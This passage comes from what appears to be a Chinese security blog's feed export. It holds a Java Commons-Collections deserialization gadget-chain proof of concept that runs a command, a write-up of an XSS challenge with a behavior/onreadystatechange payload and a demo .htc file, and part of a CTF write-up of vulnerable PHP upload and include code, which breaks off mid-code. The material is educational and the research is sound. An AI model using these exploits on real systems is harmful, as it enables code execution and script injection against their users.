class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open /Applications/Calculator.app/&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="comment">//decorate实例化LazyMap类。</span></span><br><span class="line">        <span class="comment">// LazyMap類的get方法調用了transform,transform可以通過反射机制执行命令</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);  <span class="comment">//TiedMapEntry中调用了toString方法-&gt;调用了map的get方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>); <span class="comment">//BadAttributeValueExpException的构造方法调用toString方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//         val是私有变量，所以利用下面方法进行赋值,val变量赋值为TiedMapEntry的实例化对象,</span></span><br><span class="line"><span class="comment">//         重写了BadAttributeValueExpException的readObject方法的val变量赋值为BadAttributeValueExpException类，</span></span><br><span class="line"><span class="comment">//         就会调用BadAttributeValueExpException的val = valObj.toString();触发上面的</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> poc.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(valfield);</span></span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际调试的时候我发现确实有学弟所说的情况，一图胜千言。<br>
<img src="./1574693317686.png" alt="Alt text"></p>
<p>反复调了几次都是这个情况，感觉网上文章分析并没有问题因为走到toString那个点也会触发rce，调试时候的那个点也没道理弹框，感觉是idea有bug。后来去群里请教了一下师傅，evil7大师傅给了答案。师傅意思大致就是说在调试的时候调试器打印了valObj，所以相当于提前触发了valObj的toString方法。换句话说在调试情况下RCE触发了两次。</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>记录xss挑战赛14题解题过程</title>
    <url>/2017/09/01/%E8%AE%B0%E5%BD%95xss%E6%8C%91%E6%88%98%E8%B5%9B14%E9%A2%98%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<!-- 只思考了这道题，然后就陷进去了。先来看题，考点是输出点出现在input hidden框里面，因为文本框被隐藏一般的和点击有关的事件（如 onfocus）就不会被触发了。 -->
<!-- more -->
<h2 id="解题过程">解题过程</h2>
<p>只思考了这道题，然后就陷进去了。先来看题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-XSS-Protection:0&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;x-ua-compatible&quot;</span> content=<span class="string">&quot;IE=10&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;hidden&#x27;</span> name=<span class="string">&#x27;token&#x27;</span> value=<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">  echo htmlspecialchars($_GET[&#x27;</span>token<span class="string">&#x27;]); ?&gt;&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>考点是输出点出现在input hidden框里面，因为文本框被隐藏一般的和点击有关的事件（如 onfocus）就不会被触发了。</p>
<p>传统的解法大概有三种</p>
<p>第一种：IE6下用css的expression属性触发</p>
<p>第二种：firefox用accesskey=”X” onclick=alert(),然后shift+alt+x 触发</p>
<p>第三种：如果输入点在<code>type=hidden</code>前可以用另外一个type如<code>type=text</code>将<code>type=hidden</code>覆盖掉（这道题不行）</p>
<p>显然传统的办法肯定不会通过的（规则是：需要最新浏览器，不需要交互）</p>
<p>然后我就开始了漫漫的踩坑路。因为源码中有<code>&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</code>所以我认为xss是在IE下触发.然后打开<a href="https://msdn.microsoft.com/zh-cn/library/ms535835(v=vs.85).aspx">input=hidden的官方手册</a>惊喜的发现<code>input hidden</code>下还有on*事件</p>
<p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="捕获.PNG"></p>
<p>然后百度了一下用法</p>
<ul>
<li>
<p>onbeforedeactivate	<br>
Fires immediately before the activeElement is changed from the current object to another object in the parent document.<br>
在 activeElement 从当前对象变为父文档其它对象之前立即触发。不懂~</p>
</li>
<li>
<p>ondatasetcomplete	<br>
Fires to indicate that all data is available from the data source object.<br>
数据在数据源发生变化时触发的事件，不懂~</p>
</li>
<li>
<p>oninvalid<br>
Provides specified alert text if an input element is invalid.</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">oninvalid</span>=<span class="string">&quot;alert(&#x27;该项不能空!&#x27;);&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;11&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;^(0|86|17951)?1[0-9]&#123;10&#125;&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">oninvalid</span>=<span class="string">&quot;setCustomValidity(&#x27;请输入11位手机号&#x27;);&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>onselect<br>
onselect 事件会在文本框中的文本被选中时发生。	<br>
Fires when the current selection changes.<br>
onpropertychange<br>
动态监听输入框值变化的情况，比如value属性的值改变时会触发</li>
</ul>
<p>前两个不是很懂什么意思，试了后三个都不行</p>
<p>oninvalid：oninvalid一般情况下必须要配合<code>required</code>或者<code>pattern</code>,可惜的是hidden下均不支持</p>
<p>onselect：显然框都隐藏了，不可能还需要文本，况且需要交互。</p>
<p>onpropertychange：是一个死逻辑，想改变value值就许必须有个js触发点然后用DOM，不过既然都有触法点了谁还会用这个属性（这道题而言）</p>
<p>然后我就蒙蔽了，既然通常情况下都不行，那为什么还会写在<code>input type=hidden</code>下面，黑人问号？？？</p>
<p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="捕获3.PNG"></p>
<p>最后看到了柠檬师傅的正确答案</p>
<p><code>token=' style=behavior:url(x) onreadystatechange=alert(1) '</code></p>
<p>后来查资料发现这是一个IE6~IE10支持的一个css的语法，behavior:url(???)允许调用一个外部的.htc文件来修改HTML的行为和方法（但是受同源策略影响）具体语法可以看</p>
<p>如果成功就有上传htc文件（可以写更复杂的利用代码而没有长度限制）配合xss这个思路。因为</p>
<p>.htc files are commonly used in .css files using an IE specific property called behavior, using this along with the .htc file allows the browser to run JavaScript code which is whats contained within the file.</p>
<p>下面是是一个利用demo</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">　　　　　　<span class="selector-tag">h1</span> &#123; behavior: <span class="built_in">url</span>(<span class="string">behave.htc</span>) &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>把鼠标放在这里 poluoluo.com<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attach</span> <span class="attr">for</span>=<span class="string">&quot;element&quot;</span> <span class="attr">event</span>=<span class="string">&quot;onmouseover&quot;</span> <span class="attr">handler</span>=<span class="string">&quot;hig_lite&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">attach</span> <span class="attr">for</span>=<span class="string">&quot;element&quot;</span> <span class="attr">event</span>=<span class="string">&quot;onmouseout&quot;</span> <span class="attr">handler</span>=<span class="string">&quot;low_lite&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">hig_lite</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">　　element.<span class="property">style</span>.<span class="property">color</span>=<span class="number">255</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">low_lite</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">　　element.<span class="property">style</span>.<span class="property">color</span>=<span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="最后">最后</h2>
<p>如有出错,还请指教</p>
<p>开学快乐！！</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一道题的多种解法</title>
    <url>/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/</url>
    <content><![CDATA[<!-- 题目是：工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面。 -->
<!-- more -->
<p>通过备份文件泄露拿到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span>(<span class="params"><span class="variable">$page</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;uploaded&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no uploaded uploaded uploaded uploaded !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;://f&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ://f ://f ://f&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;ata&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no ata ata ata&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no 0 0 0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;./includes/<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;File is not exit &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$adfile</span>, <span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//Only Administrators can download files .</span></span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$adfile</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$adfile</span>, <span class="string">&#x27;r&#x27;</span>) === <span class="string">&#x27;Yeah Everything Will Be Ok My Boss&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome ! You Are Administrator !&quot;</span>;</span><br><span class="line">      <span class="variable">$cert</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cert</span> === <span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="string">&#x27;file_list&#x27;</span>) != <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&#x27;error4&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="string">&#x27;file_list&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Description: File Transfer&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>. <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>));</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: public&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>));</span><br><span class="line">      <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;error3&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125;<span class="comment">//不允许跳目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$page</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;no ./ ./ ./ ./&#x27;</span>);</span><br><span class="line">&#125;<span class="comment">//不允许用协议</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$page</span>, <span class="string">&#x27;://&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;no :// :// ://&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">autoload</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[admin]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[file])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[admin], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[file], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;not flag flag flag falg !&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[file]) &gt;= <span class="number">38</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">download</span>(<span class="variable">$_GET</span>[admin], <span class="variable">$_GET</span>[file]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个题还有一个上传点，要拿到upload.php。读文件的点在</p>
<ul>
<li>这里可以用远程服务器写 echo -n “Yeah Everything Will Be Ok My Boss” &gt;&gt; index.html，然后访问读取</li>
<li>也可以php://input+Yeah Everything Will Be Ok My Boss</li>
</ul>
<p>下面拿到download.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="comment">//properties of the uploaded file</span></span><br><span class="line">    <span class="variable">$name</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$type</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="variable">$size</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$temp</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$error</span>= <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">6</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;name is too long !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$name</span>, <span class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;invalid parameter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$name</span>, <span class="string">&#x27;php&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;invalid parameter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//只能上传zip</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;zip&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;jpg&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">3</span>, <span class="number">3</span>) !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;file can not upload ! &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span> &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Error uploading file! code <span class="subst">$error</span>.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$type</span> !== <span class="string">&quot;application/zip&quot;</span> || <span class="variable">$size</span> &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Format not allowed or file size too big!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;includes&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;includes/uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload complete a!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/ &#x27;</span>);</span><br><span class="line">          &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;uploaded&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload complete!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/unzip.sh&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]) === <span class="number">20</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;lag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span 